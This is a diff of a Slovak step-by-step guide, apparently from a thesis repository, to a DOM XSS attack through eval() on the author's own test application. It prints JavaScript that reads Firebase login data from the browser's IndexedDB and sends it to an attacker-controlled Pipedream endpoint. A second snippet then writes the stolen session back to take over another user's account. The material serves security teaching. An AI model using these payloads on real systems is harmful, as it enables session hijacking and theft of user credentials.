@@ -3,9 +3,9 @@
 ### Prostredie: Dp-Test-Enviroment - https://github.com/MatusVetrik/dp-test-enviroment
 
 - Pri útoku využijeme zraniteľnú funkciu eval(), ktorá vyhodnotí vloženú hodnotu v akomkoľvek tvare.
-- Každopádne tým, že vyhodnotí akúkoľvek hodnotu tak vyhodnotí aj škodlivý kód, ktorý ako argument vložíme.
+- Každopádne tým, že vyhodnotí akúkoľvek hodnotu, vyhodnotí aj škodlivý kód, ktorý ako argument vložíme.
 - Vstup s textom "Enter equation..." vyhodnocuje práve funkcia eval() a predpokladáme, že na tomto mieste vzniká zraniteľnosť.
-- Pokúsime sa o ukradnutie uživateľových dát z databázy prehliadaču. Do inputu vložíme nasledujúci kód.
+- Pokúsime sa o ukradnutie puživateľoských dát z databázy prehliadača. Do vstupu vložíme nasledujovný kód:
     
           const request = window.indexedDB.open("firebaseLocalStorageDb");
             request.onsuccess = (event) => {
@@ -32,12 +32,12 @@
               fetch("pipedream-endpoint", options); 
               }
             };
-- Tento kód sprístupní lokálnu databázu indexDB prehliadača a umožní nám vytiahnúť hodnoty z databázy. Náš momentálne zaujíma tabuľka "firebaseLocalStorage", ktorú nastavuje
-  externá API Firebase, ktorú používa aplikácia na autentifikáciu. Po jej vytiahnutí sa celý objekt odošle na náš vytvorený endpoint na Pipedreame (inštalácia link).
+- Tento kód sprístupní lokálnu databázu (indexDB) prehliadača a umožní nám vytiahnúť hodnoty z databázy. Nás momentálne zaujíma tabuľka "firebaseLocalStorage", ktorú nastavuje
+  externá API Firebase, ktorú používa aplikácia na autentifikáciu. Po jej vytiahnutí sa celý objekt odošle na náš vytvorený endpoint v službe Pipedreame.
 - V kóde sa nachádza komentár nad funkciou fetch(). Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvoríme
-  nový projekt. Po vytvorení projketu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do hášho kódu.
+  nový projekt. Po vytvorení projketu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do nášho kódu.
 - Kód vložíme do vstupného poľa a stalčíme "Enter".
-- Teraz sa môžeme odhlásiť a prihlásiť sa do lubovľného účtu, ktorý už máme vytvorený alebo si vytvoríme nový.
+- Teraz sa môžeme odhlásiť a prihlásiť sa do lubovoľného účtu, ktorý už máme vytvorený alebo si vytvoríme nový.
 - Prejdeme znova na obrazovku s kalkulačkou a vložíme nasledujúci kód do rovnakého vstupu.
         const request = window.indexedDB.open("firebaseLocalStorageDb");
         request.onsuccess = (event) => {
@@ -81,7 +81,7 @@
   
           addDataRequest.onsuccess = (event) => alert("Success!");
         };
-- Kód uloží, respektíve prepíše dáta o prihlásenom používateľovi. Objekt "data" v ukážke je len na demonštráciu ako taký objekt vyzerá. Nahradíme ho objektom, ktorý nám došiel na vytvorený ednpoint po vygenerovaní objednávky.
-    Objekt bude pravdepodobne treba preformátovať, takže názvy atribútov objektu musie byť bez úvodzoviek, tak ako tomu je v ukážkovom objekte.
+- Kód uloží, respektíve prepíše dáta o prihlásenom používateľovi. Objekt "data" v ukážke je len na demonštráciu . Nahradíme ho objektom, ktorý nám prišiel na vytvorený ednpoint.
+    Objekt bude pravdepodobne treba preformátovať, takže názvy atribútov objektu musia byť bez úvodzoviek, tak ako tomu je v ukážkovom objekte.
 - Po kliknuti klávesy "Enter" sme si do prehliadača uložili prihlasovacie údaje iného používateľa a teraz sme prihlásený pod jeho prihalsovacimi údajmi.
 - Video návod sa nachádza v priečinku "video_instructions": /video_instructions/dom-xss-eval.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/dom-xss-eval.mp4)
